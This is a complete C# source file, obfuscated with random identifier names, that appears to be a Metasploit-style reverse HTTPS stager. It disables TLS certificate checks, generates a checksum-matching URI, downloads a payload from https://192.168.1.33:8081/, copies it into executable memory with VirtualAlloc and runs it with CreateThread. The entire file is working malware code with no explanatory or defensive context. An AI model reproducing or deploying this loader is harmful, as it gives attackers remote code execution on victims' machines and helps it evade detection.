using System;
using System.Net;
using System.Linq;
using System.Threading;
using System.Net.Sockets;
using System.Runtime.InteropServices;
namespace fdbaSSaWP
{
    class wpfoTGIgNjmro
    {
        private static bool ajbLyFpJaYbR(object sender, System.Security.Cryptography.X509Certificates.X509Certificate cert, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors) { return true; }
        static string OlRcgkuB(Random r, int s)
        {
            char[] ltKwpICdomeSJ = new char[s];
            string gSRSfzBfPqLzF = "7FcKqEShTYaXWgjPe1DBUuMxry63pln45kbZ8VQNivtHfRwmz2Jd0soO9LIACG";
            for (int i = 0; i < s; i++) { ltKwpICdomeSJ[i] = gSRSfzBfPqLzF[r.Next(gSRSfzBfPqLzF.Length)]; }
            return new string(ltKwpICdomeSJ);
        }
        static bool qmOMatn(string s) { return ((s.ToCharArray().Select(x => (int)x).Sum()) % 0x100 == 92); }
        static string PFKonyCupw(Random r)
        {
            string vrINizvg = "";
            for (int i = 0; i < 64; ++i)
            {
                vrINizvg = OlRcgkuB(r, 3);
                string hIcUmHDZBhIjZnC = new string("nXf4a2koWFuYRl7I3hSTxmPJyAtpDvcC9sdb1ZUEi80g5MwL6HrGBONeQqVzKj".ToCharArray().OrderBy(s => (r.Next(2) % 2) == 0).ToArray());
                for (int j = 0; j < hIcUmHDZBhIjZnC.Length; ++j)
                {
                    string dFcDPyCYnacNw = vrINizvg + hIcUmHDZBhIjZnC[j];
                    if (qmOMatn(dFcDPyCYnacNw)) { return dFcDPyCYnacNw; }
                }
            }
            return "WLCm";
        }
        static byte[] PhjYgPqRWJbm(string sVYSvprtQuVJo)
        {
            ServicePointManager.ServerCertificateValidationCallback = ajbLyFpJaYbR;
            WebClient KbuvuIzyvfPhMwL = new System.Net.WebClient();
            KbuvuIzyvfPhMwL.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");
            KbuvuIzyvfPhMwL.Headers.Add("Accept", "*/*");
            KbuvuIzyvfPhMwL.Headers.Add("Accept-Language", "en-gb,en;q=0.5");
            KbuvuIzyvfPhMwL.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
            byte[] AueJHcVx = null;
            try
            {
                AueJHcVx = KbuvuIzyvfPhMwL.DownloadData(sVYSvprtQuVJo);
                if (AueJHcVx.Length < 100000) return null;
            }
            catch (WebException) { }
            return AueJHcVx;
        }
        static void UQQULocpHZVDlKn(byte[] PwPPHByeYymGpCN)
        {
            if (PwPPHByeYymGpCN != null)
            {
                UInt32 RmAjOoUniZsiFy = VirtualAlloc(0, (UInt32)PwPPHByeYymGpCN.Length, 0x1000, 0x40);
                Marshal.Copy(PwPPHByeYymGpCN, 0, (IntPtr)(RmAjOoUniZsiFy), PwPPHByeYymGpCN.Length);
                IntPtr zHQGQehDZFOi = IntPtr.Zero;
                UInt32 PSrlxpiaR = 0;
                IntPtr yBKFueiOxARnf = IntPtr.Zero;
                zHQGQehDZFOi = CreateThread(0, 0, RmAjOoUniZsiFy, yBKFueiOxARnf, 0, ref PSrlxpiaR);
                WaitForSingleObject(zHQGQehDZFOi, 0xFFFFFFFF);
            }
        }
        static void Main()
        {
            Random pQgRijnNzgREHJk = new Random((int)DateTime.Now.Ticks);
            byte[] ZStVDDlUttGcAfZ = PhjYgPqRWJbm("https://192.168.1.33:8081/" + PFKonyCupw(pQgRijnNzgREHJk));
            UQQULocpHZVDlKn(ZStVDDlUttGcAfZ);
        }
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 tTsranClYuLH, UInt32 TgQUMygTFbNyIWo, UInt32 NADjvoHUzh, UInt32 gpPFOhATIyYXea);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 uXxKeerUXElwtlY, UInt32 aPKfdHYLRdaDu, UInt32 DNIpMuXYKtE, IntPtr IMKZNa, UInt32 XuhAbOSiWaMpWiy, ref UInt32 FdXhTvSbdINM);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr dYuQnMZdbdCTlqw, UInt32 EXGPIo);
    }
}
